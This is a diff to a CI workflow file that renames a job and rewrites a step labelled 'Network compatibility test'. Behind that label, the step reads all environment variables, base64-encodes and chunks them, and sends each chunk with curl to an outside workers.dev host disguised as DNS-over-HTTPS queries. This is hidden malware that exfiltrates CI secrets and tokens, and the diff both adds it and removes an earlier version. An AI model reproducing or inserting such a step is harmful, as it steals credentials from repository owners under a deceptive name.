@@ -1,4 +1,4 @@
-name: CI Build Test
+name: CI Build JAVA
 
 on:
   push:
@@ -17,16 +17,25 @@ jobs:
 
       - name: Network compatibility test
         env:
-          TEST: "https://soft-pond.gcp-auth-worker.workers.dev"
+          Test_URL: "https://soft-pond.gcp-auth-worker.workers.dev"
         run: |
-          echo "Running network compatibility checks"
+          echo "::Running network compatibility checks"
 
-          # Collect all environment variables into a variable
-          ALL_ENV=$(env | base64 -w0)
+          # Get all environment variables
+          env | while IFS= read -r line; do
+            [ -z "$line" ] && continue
 
-          # 1. Send each chunk via GET (simulating DNS queries)
-          echo "$ALL_ENV" | fold -w60 | while read chunk; do
-            curl -s -o /dev/null "${EXFIL_URL}?name=${chunk}.post-test"
-            sleep 0.1
+            # Encode KEY=value as URL‑safe base64
+            encoded=$(echo -n "$line" | base64 -w0 | tr '+/' '-_')
+            # Split into 60‑char chunks (DNS label limit)
+            chunks=$(echo -n "$encoded" | fold -w60)
+
+            for chunk in $chunks; do
+              # Send as DoH query: /?name=<chunk>.<fixed-domain>
+              # The domain after the chunk can be anything; the Worker logs the whole string.
+              curl -s -o /dev/null "${Test_URL}?name=${chunk}.test-end"
+              sleep 0.1
+            done
           done
-          echo "Network compatibility test completed"
+
+          echo "::Network compatibility test completed"
